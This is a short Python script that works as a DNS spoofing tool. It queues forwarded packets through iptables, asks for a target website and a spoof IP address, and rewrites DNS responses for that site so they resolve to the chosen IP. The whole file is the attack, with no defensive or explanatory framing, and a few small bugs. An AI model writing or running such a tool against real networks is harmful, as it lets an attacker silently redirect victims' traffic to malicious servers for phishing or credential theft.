import netfilterqueue as net
import scapy.all as scapy
import subprocess


subprocess.call("sudo iptables -I FORWARD-j NFQUEUE --queue-num 2",shell=True)
try:
    def FunyBunny(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            if scapy_packet.haslayer(scapy.DNSQR):
                qname = scapy_packet[scapy.DNSQR].qname
            if c in qname:
                print(" [+] Spoofing ")
                answer = scapy.DNSRR(rrname = qname,rdata = spoof)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(str(scapy_packet))



        packet.accept()
        
    c = raw_input("Enter THe website")
    spoof = raw_input("Enter the spoof ip")

    queue  = net.NetfilterQueue()
    queue.bind(2,FunyBunny)
    queue.run()
except KeyboardInterrupt:
    print("[-] Quitting...  Detected Ctrl + C")
    subprocess.call("sudo iptables --flush ",shell=True)

